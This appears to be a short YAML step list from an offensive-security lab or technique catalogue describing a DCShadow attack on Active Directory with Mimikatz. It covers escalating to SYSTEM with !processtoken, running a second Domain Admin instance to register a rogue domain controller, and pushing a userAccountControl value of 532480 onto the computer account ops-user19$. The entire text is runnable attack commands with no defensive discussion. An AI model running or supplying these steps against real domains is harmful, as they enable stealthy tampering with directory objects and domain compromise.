    steps: |
      1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.
      2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.
      3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
      4. lsadump::dcshadow /push
